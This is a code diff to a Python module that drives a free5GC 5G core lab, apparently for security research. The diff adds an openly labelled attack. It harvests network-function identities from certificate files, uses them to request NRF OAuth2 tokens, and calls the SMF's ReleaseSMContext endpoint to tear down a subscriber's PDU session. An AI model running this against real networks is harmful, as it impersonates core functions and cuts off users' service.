@@ -5,14 +5,17 @@ This module is the ONLY place that talks to the live free5GC / UERANSIM
 stack. It never fabricates data. Every function either returns what the
 live system actually reported, or raises / returns an explicit error.
 
-Three real signal sources are used to establish ground truth:
+All core interaction is RESTful (HTTP against free5GC's own service-based
+interfaces). Three real signal sources establish ground truth:
   1. free5GC WebConsole REST API   — subscriber profile + AMF UE context
      (AMF /namf-oam/v1/registered-ue-context → array of UEContext with
       keys: Supi, Guti, Mcc, Mnc, Tac, PduSessions[{PduSessionId, Sst,
       Sd, Dnn, SmContextRef}], CmState)
-  2. UERANSIM nr-cli               — control-plane truth from the UE itself
-     ('ps-list' emits YAML keyed "PDU Session<psi>" for ACTIVE sessions only)
+  2. SMF Nsmf interfaces (REST)    — ReleaseSMContext (the network-initiated
+     release the attack drives) and the SMF OAM ue-pdu-session-info view
+     (PDUAddress, UpCnxState), both reached over HTTP via the WebConsole / SBI
   3. Data-plane probe              — a ping bound to the UE's uesimtun iface
+     (host-level physical confirmation only; it does not drive the UE)
 
 If the core is OFF, or the UE is not registered, these functions report
 exactly that. Nothing here invents an ACTIVE session or a success.
@@ -55,10 +58,6 @@ def load_config() -> Dict[str, Any]:
 
 def _fg() -> Dict[str, Any]:
     return load_config().get("free5gc", {})
-
-
-def _ue_cfg() -> Dict[str, Any]:
-    return load_config().get("ueransim", {})
 
 
 def norm_supi(supi: str) -> str:
@@ -122,96 +121,192 @@ def wc_put(path: str, body: Dict) -> requests.Response:
 
 
 # ===========================================================================
-# 2. UERANSIM nr-cli client (real control-plane truth)
+# 1b. SMF service-based interface (Nsmf_PDUSession) — network-initiated release
 # ===========================================================================
+def _smf() -> Dict[str, Any]:
+    return load_config().get("smf", {})
+
+
+def _smf_base() -> str:
+    smf = _smf()
+    url = smf.get("sbi_url")
+    if url:
+        return url.rstrip("/")
+    scheme = smf.get("scheme", "http")
+    host = smf.get("host", "127.0.0.2")
+    port = smf.get("port", 8000)
+    return f"{scheme}://{host}:{port}"
+
+
 @dataclass
-class NrCliResult:
+class SmfReleaseResult:
     ok: bool
-    stdout: str
-    stderr: str
-    returncode: int
-    node_missing: bool = False
-    cli_error: bool = False  # nr-cli printed "ERROR: ..." on stdout
+    status_code: int
+    endpoint: str
+    detail: str = ""
 
 
-def nr_cli(node: str, exec_cmd: str, timeout: int = 10) -> NrCliResult:
+def smf_release_sm_context(sm_context_ref: str, access_token: str = "") -> SmfReleaseResult:
     """
-    Run `nr-cli <node> --exec '<exec_cmd>'` and faithfully classify the result.
+    Invoke the SMF's Nsmf_PDUSession ReleaseSMContext operation directly:
 
-    nr-cli exits 0 even for logical errors (e.g. missing node), so we MUST
-    inspect stdout — this is exactly the bug that made the old demo fake.
+        POST {smf}/nsmf-pdusession/v1/sm-contexts/{ref}/release
+
+    This is the NETWORK-INITIATED release path (3GPP TS 23.502 §4.3.4): the SMF
+    deletes the N4/PFCP session on the UPF and signals the UE through the AMF.
+    The core terminates the session — the UE is not driven to release itself.
+
+    free5GC's SBI is OAuth2-protected, so `access_token` (an NRF-signed JWT with
+    scope 'nsmf-pdusession') is sent as a Bearer token. `detail` carries the SMF's
+    real HTTP response body on failure — nothing is fabricated.
+
+    `sm_context_ref` is the reference the AMF reports (e.g. 'urn:uuid:...'), which
+    is exactly the key the SMF stores its SM context under. It is a single path
+    segment, so it is passed literally (its ':' are not percent-encoded).
     """
-    nr = _ue_cfg().get("nr_cli_path", "./UERANSIM/build/nr-cli")
-    cmd = [nr, node, "--exec", exec_cmd]
+    endpoint = f"{_smf_base()}/nsmf-pdusession/v1/sm-contexts/{sm_context_ref}/release"
+    headers = {"Content-Type": "application/json"}
+    if access_token:
+        headers["Authorization"] = f"Bearer {access_token}"
     try:
-        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
-    except FileNotFoundError as e:
-        return NrCliResult(False, "", str(e), 127, node_missing=False, cli_error=True)
-    except subprocess.TimeoutExpired as e:
-        return NrCliResult(False, "", f"timeout: {e}", 124, cli_error=True)
-
-    out = (p.stdout or "").strip()
-    err = (p.stderr or "").strip()
-    low = out.lower()
-    node_missing = "no node found" in low
-    cli_error = node_missing or low.startswith("error") or "error:" in low
-    ok = (p.returncode == 0) and not cli_error
-    return NrCliResult(ok, out, err, p.returncode, node_missing=node_missing, cli_error=cli_error)
+        resp = requests.post(endpoint, headers=headers, data="{}", timeout=8)
+    except requests.exceptions.RequestException as e:
+        raise CoreUnavailable(f"SMF ReleaseSMContext unreachable at {endpoint}: {e}") from e
+    ok = 200 <= resp.status_code < 300
+    detail = "" if ok else (resp.text or "")[:200]
+    return SmfReleaseResult(ok=ok, status_code=resp.status_code, endpoint=endpoint, detail=detail)
 
 
-def ue_node_exists(supi: str) -> bool:
-    """True iff an nr-ue process for this SUPI is registered with nr-cli."""
-    nr = _ue_cfg().get("nr_cli_path", "./UERANSIM/build/nr-cli")
-    try:
-        p = subprocess.run([nr, "--dump"], capture_output=True, text=True, timeout=8)
-    except Exception as e:
-        logger.debug("nr-cli --dump failed: %s", e)
-        return False
-    nodes = [ln.strip() for ln in (p.stdout or "").splitlines() if ln.strip()]
-    return norm_supi(supi) in nodes
+# ===========================================================================
+# 1c. NRF access-token (OAuth2) — the credential the SBI release requires
+# ===========================================================================
+import glob as _glob
+import re as _re
+
+_NF_CERT_RE = _re.compile(r"([a-z0-9]+)_([0-9a-fA-F-]{36})\.pem$")
 
 
-def ps_list(supi: str) -> Dict[str, Any]:
+def _nrf() -> Dict[str, Any]:
+    return load_config().get("nrf", {})
+
+
+def _nrf_base() -> str:
+    url = _nrf().get("sbi_url")
+    return url.rstrip("/") if url else "http://127.0.0.10:8000"
+
+
+def _cert_dir() -> str:
+    root = os.path.dirname(os.path.dirname(__file__))
+    cd = _nrf().get("cert_dir") or os.path.join("free5gc", "cert")
+    return cd if os.path.isabs(cd) else os.path.join(root, cd)
+
+
+def _consumer_identities() -> List[tuple]:
     """
-    Real PDU session list straight from the UE via nr-cli 'ps-list'.
-    Only ACTIVE sessions are emitted by UERANSIM.
-
-    Returns:
-        {"available": bool, "sessions": {psi:int -> {state,address,...}}, "error": str?}
-        available=False means the UE node is absent (nr-ue not running) — i.e.
-        there is genuinely no UE to have a session, NOT a faked empty success.
+    (nfType, nfInstanceId) pairs the agent can present to the NRF. These are the
+    NF identities whose per-instance certificate the NRF trusts on disk
+    (cert/<type>_<uuid>.pem); a pinned `nrf.consumer` overrides auto-detection.
     """
-    if not ue_node_exists(supi):
-        return {"available": False, "sessions": {}, "error": "UE node not present (nr-ue not running)"}
-    res = nr_cli(norm_supi(supi), "ps-list")
-    if not res.ok:
-        return {"available": False, "sessions": {}, "error": res.stdout or res.stderr or "ps-list failed"}
-    sessions: Dict[int, Dict[str, Any]] = {}
+    nf = _nrf().get("consumer") or {}
+    if nf.get("type") and nf.get("instance_id"):
+        return [(str(nf["type"]).upper(), str(nf["instance_id"]))]
+    ids: List[tuple] = []
+    for path in _glob.glob(os.path.join(_cert_dir(), "*_*.pem")):
+        m = _NF_CERT_RE.search(os.path.basename(path))
+        if m:
+            ids.append((m.group(1).upper(), m.group(2)))
+    return ids
+
+
+@dataclass
+class TokenResult:
+    ok: bool
+    token: str
+    detail: str
+    nf_type: str = ""
+    nf_instance_id: str = ""
+
+
+def nrf_access_token(scope: str, target_nf_type: str = "SMF") -> TokenResult:
+    """
+    Request an OAuth2 access token from the NRF for <scope> (e.g.
+    'nsmf-pdusession'), presenting a registered NF identity. Returns the raw NRF
+    outcome — the token it issued, or the real error it returned. Nothing faked.
+    """
+    identities = _consumer_identities()
+    if not identities:
+        return TokenResult(False, "", f"no NF identity to present (no cert/<type>_<uuid>.pem under {_cert_dir()})")
+    base = _nrf_base()
+    last = ""
+    for nf_type, nf_id in identities:
+        form = {
+            "grant_type": "client_credentials",
+            "nfInstanceId": nf_id,
+            "nfType": nf_type,
+            "targetNfType": target_nf_type,
+            "scope": scope,
+        }
+        try:
+            resp = requests.post(f"{base}/oauth2/token", data=form, timeout=5)
+        except requests.exceptions.RequestException as e:
+            raise CoreUnavailable(f"NRF token endpoint unreachable at {base}/oauth2/token: {e}") from e
+        if resp.ok:
+            token = ""
+            try:
+                token = (resp.json() or {}).get("access_token", "")
+            except Exception:
+                pass
+            if token:
+                return TokenResult(True, token, f"NRF issued token for {nf_type} scope={scope}", nf_type, nf_id)
+            last = "NRF returned HTTP 200 but no access_token"
+        elif "oauth2 not enable" in (resp.text or "").lower():
+            # NRF has OAuth2 disabled — the SBI accepts unauthenticated calls.
+            return TokenResult(False, "", "NRF OAuth2 disabled (no token required)")
+        else:
+            last = f"NRF HTTP {resp.status_code} for {nf_type}: {(resp.text or '')[:160]}"
+    return TokenResult(False, "", last or "NRF rejected every available NF identity")
+
+
+# ===========================================================================
+# 2. SMF OAM view of a PDU session (RESTful, via the WebConsole)
+# ===========================================================================
+def ue_pdu_session_info(sm_context_ref: str) -> Dict[str, Any]:
+    """
+    SMF OAM view of one PDU session, fetched over REST through the WebConsole
+    (GET /api/ue-pdu-session-info/{ref} → SMF /nsmf-oam/v1/ue-pdu-session-info).
+
+    Returns the parsed JSON (including 'PDUAddress', the UE IP, and 'UpCnxState')
+    or {} if the session is unknown. Fully RESTful — no UE-side tooling.
+    """
+    if not sm_context_ref:
+        return {}
+    resp = wc_get(f"/api/ue-pdu-session-info/{sm_context_ref}")
+    if not resp.ok:
+        return {}
     try:
-        parsed = yaml.safe_load(res.stdout) or {}
-    except Exception as e:
-        return {"available": True, "sessions": {}, "error": f"could not parse ps-list: {e}", "raw": res.stdout}
-    if isinstance(parsed, dict):
-        for key, val in parsed.items():
-            # key looks like "PDU Session1"
-            digits = "".join(ch for ch in key if ch.isdigit())
-            psi = int(digits) if digits else 0
-            if isinstance(val, dict):
-                sessions[psi] = val
-    return {"available": True, "sessions": sessions, "raw": res.stdout}
+        data = resp.json()
+    except Exception:
+        return {}
+    return data if isinstance(data, dict) else {}
 
 
-def session_is_active(supi: str, psi: int) -> bool:
-    """Ground truth: does PDU session <psi> actually exist and ACTIVE right now?"""
-    pl = ps_list(supi)
-    if not pl.get("available"):
-        return False
-    sess = pl["sessions"].get(psi)
-    if not sess:
-        return False
-    state = str(sess.get("state", "")).upper()
-    # UERANSIM only lists active sessions; treat absence of explicit INACTIVE as active.
-    return "INACTIVE" not in state
+def pdu_session_ip(sm_context_ref: str) -> Optional[str]:
+    """UE IP for a PDU session, discovered over REST (SMF OAM). None if unknown."""
+    info = ue_pdu_session_info(sm_context_ref)
+    addr = str(info.get("PDUAddress", info.get("pduAddress", "")) or "").split("/")[0].strip()
+    return addr or None
+
+
+def user_plane_activated(sm_context_ref: str) -> Optional[bool]:
+    """
+    Is the user plane up for this PDU session, per the SMF (UpCnxState==ACTIVATED)?
+    Returns None if the SMF has no such context (can't tell). Fully RESTful.
+    """
+    info = ue_pdu_session_info(sm_context_ref)
+    if not info:
+        return None
+    state = str(info.get("UpCnxState", info.get("upCnxState", "")) or "").upper()
+    return state == "ACTIVATED" if state else None
 
 
 # ===========================================================================
@@ -253,6 +348,26 @@ def registered_ue_context(supi: str) -> Dict[str, Any]:
     return {"registered": True, "cm_state": cm_state, "pdu_sessions": pdu, "http_status": 200}
 
 
+def amf_pdu_session(supi: str, psi: int) -> Optional[Dict[str, Any]]:
+    """
+    Core-side lookup: return the AMF-reported PDU session <psi> (including its
+    sm_context_ref, needed to address a network-initiated release), or None if
+    the UE is not attached or has no such session.
+    """
+    ctx = registered_ue_context(supi)
+    if not ctx.get("registered"):
+        return None
+    for s in ctx.get("pdu_sessions", []):
+        if int(s.get("id", -1)) == int(psi):
+            return s
+    return None
+
+
+def amf_session_active(supi: str, psi: int) -> bool:
+    """Core-side ground truth: does the AMF still register PDU session <psi>?"""
+    return amf_pdu_session(supi, psi) is not None
+
+
 def subscriber_profile(supi: str) -> Dict[str, Any]:
     """Real provisioned profile from the WebConsole subscriber DB (or {} / raises)."""
     ns = norm_supi(supi)
@@ -266,8 +381,10 @@ def subscriber_profile(supi: str) -> Dict[str, Any]:
 
 
 # ===========================================================================
-# 4. Data-plane probe (independent third signal)
+# 4. Data-plane probe (independent, host-level physical signal)
 # ===========================================================================
+# The UE IP is discovered over REST (SMF OAM); this probe only inspects the host
+# network and pings through the UE's tunnel interface. It does NOT drive the UE.
 def _iface_for_ip(ip: str) -> Optional[str]:
     try:
         out = subprocess.run(["ip", "-o", "-4", "addr", "show"], capture_output=True, text=True, timeout=5).stdout
@@ -280,21 +397,15 @@ def _iface_for_ip(ip: str) -> Optional[str]:
     return None
 
 
-def data_plane_up(supi: str, psi: int = 1, target: str = "8.8.8.8") -> Dict[str, Any]:
+def data_plane_probe(ip: Optional[str], target: str = "8.8.8.8") -> Dict[str, Any]:
     """
-    Best-effort independent check: can traffic actually leave via the UE tunnel?
-    Returns {"checked": bool, "up": bool, "iface": str?, "detail": str}.
-    checked=False means we couldn't map the session to a tunnel (not a failure).
+    Independent physical check: can traffic actually leave via the UE's tunnel
+    interface for <ip> (discovered over REST)? Returns
+    {"checked": bool, "up": bool, "iface": str?, "detail": str}.
+    checked=False means we couldn't map the IP to a tunnel (not a failure).
     """
-    pl = ps_list(supi)
-    sess = pl.get("sessions", {}).get(psi) if pl.get("available") else None
-    ip = None
-    if sess:
-        addr = sess.get("address")
-        if isinstance(addr, str):
-            ip = addr.split("/")[0]
     if not ip:
-        return {"checked": False, "up": False, "detail": "no UE tunnel IP for this session"}
+        return {"checked": False, "up": False, "detail": "no UE IP available for this session"}
     iface = _iface_for_ip(ip)
     if not iface:
         return {"checked": False, "up": False, "detail": f"no uesimtun iface bound to {ip}"}
@@ -312,14 +423,32 @@ def data_plane_up(supi: str, psi: int = 1, target: str = "8.8.8.8") -> Dict[str,
 # ===========================================================================
 # 5. Health / preflight
 # ===========================================================================
+def smf_reachable() -> bool:
+    """
+    True iff the SMF service-based interface answers HTTP — i.e. the core NF that
+    the attack actually drives (ReleaseSMContext) is running. Any HTTP response
+    (even a 404) proves the SBI is listening; a connection error / timeout means
+    the 5G core is not up. This is independent of the WebConsole.
+    """
+    try:
+        requests.get(_smf_base(), timeout=3)
+        return True
+    except requests.exceptions.RequestException:
+        return False
+
+
 @dataclass
 class Health:
     webconsole: bool = False
+    smf: bool = False
     detail: Dict[str, Any] = field(default_factory=dict)
 
     @property
     def core_up(self) -> bool:
-        return self.webconsole
+        # The attack needs BOTH planes it touches: the WebConsole/AMF for session
+        # discovery and the SMF SBI for the release. WebConsole alone is not a
+        # live 5G core.
+        return self.webconsole and self.smf
 
 
 def core_health() -> Health:
@@ -329,4 +458,7 @@ def core_health() -> Health:
         h.webconsole = True
     except CoreUnavailable as e:
         h.detail["webconsole_error"] = str(e)
+    h.smf = smf_reachable()
+    if not h.smf:
+        h.detail["smf_error"] = f"SMF SBI not reachable at {_smf_base()}"
     return h
